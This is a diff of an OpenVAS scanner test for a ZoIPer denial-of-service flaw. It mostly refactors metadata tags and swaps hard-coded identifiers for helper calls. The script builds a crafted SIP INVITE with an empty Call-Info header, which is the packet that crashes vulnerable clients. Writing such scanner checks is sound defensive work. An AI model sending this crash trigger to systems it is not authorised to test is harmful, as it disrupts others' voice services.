@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_zoiper_empty_callinfo_dos_vuln.nasl 4889 2016-12-30 13:13:50Z cfi $
+# $Id: gb_zoiper_empty_callinfo_dos_vuln.nasl 10974 2018-08-15 09:55:34Z cfischer $
 #
 # ZoIPer Empty Call-Info Denial of Service Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800963");
-  script_version("$Revision: 4889 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-30 14:13:50 +0100 (Fri, 30 Dec 2016) $");
+  script_version("$Revision: 10974 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-15 11:55:34 +0200 (Wed, 15 Aug 2018) $");
   script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
@@ -44,26 +44,20 @@ if(description)
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53792");
   script_xref(name:"URL", value:"http://packetstormsecurity.org/0910-exploits/zoiper_dos.py.txt");
 
-  tag_impact = "Successful exploitation will allow attackers to cause the service to crash.
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the service to crash.
 
-  Impact Level: Application";
+  Impact Level: Application");
 
-  tag_affected = "ZoIPer version prior to 2.24 (Windows) and 2.13 (Linux)";
+  script_tag(name:"affected", value:"ZoIPer version prior to 2.24 (Windows) and 2.13 (Linux)");
 
-  tag_insight = "The flaw is due to an error while handling specially crafted SIP INVITE
-  messages which contain an empty Call-Info header.";
+  script_tag(name:"insight", value:"The flaw is due to an error while handling specially crafted SIP INVITE
+  messages which contain an empty Call-Info header.");
 
-  tag_solution = "Upgrade to ZoIPer version 2.24 (Windows) and 2.13 (Linux) or later,
-  http://www.zoiper.com/zoiper.php";
+  script_tag(name:"solution", value:"Upgrade to ZoIPer version 2.24 (Windows) and 2.13 (Linux) or later,
+  http://www.zoiper.com/zoiper.php");
 
-  tag_summary = "This host is running ZoIPer and is prone to Denial of Service
-  vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"This host is running ZoIPer and is prone to Denial of Service
+  vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -72,6 +66,7 @@ if(description)
 }
 
 include("sip.inc");
+include("misc_func.inc");
 
 infos = get_sip_port_proto( default_port:"5060", default_proto:"udp" );
 port = infos['port'];
@@ -82,15 +77,18 @@ if( "Zoiper" >!< banner ) exit( 0 );
 
 if( ! sip_alive( port:port, proto:proto ) ) exit( 0 );
 
+from_default = get_vt_string();
+from_lower   = get_vt_string( lowercase:TRUE );
+
 req = string(
-  "INVITE sip:openvas@", get_host_name(), " SIP/2.0","\r\n",
+  "INVITE sip:", from_lower, "@", get_host_name(), " SIP/2.0","\r\n",
   "Via: SIP/2.0/", toupper( proto ), " ", this_host(), ":", port, ";branch=z9hG4bKJRnTggvMGl-6233","\r\n",
   "Max-Forwards: 70","\r\n",
-  "From: OpenVAS <sip:OpenVAS@", this_host(),">;tag=f7mXZqgqZy-6233","\r\n",
-  "To: openvas <sip:openvas@", get_host_name(), ":", port, ">","\r\n",
+  "From: ", from_default, " <sip:", from_lower, "@", this_host(),">;tag=f7mXZqgqZy-6233","\r\n",
+  "To: ", from_default, " <sip:", from_lower, "@", get_host_name(), ":", port, ">","\r\n",
   "Call-ID: ", rand(),"\r\n",
   "CSeq: 6233 INVITE","\r\n",
-  "Contact: <sip:OpenVAS@", get_host_name(),">","\r\n",
+  "Contact: ", from_default, " <sip:", from_lower, "@", get_host_name(),">","\r\n",
   "Content-Type: application/sdp","\r\n",
   "Call-Info:","\r\n",
   "Content-Length: 125","\r\n\r\n");
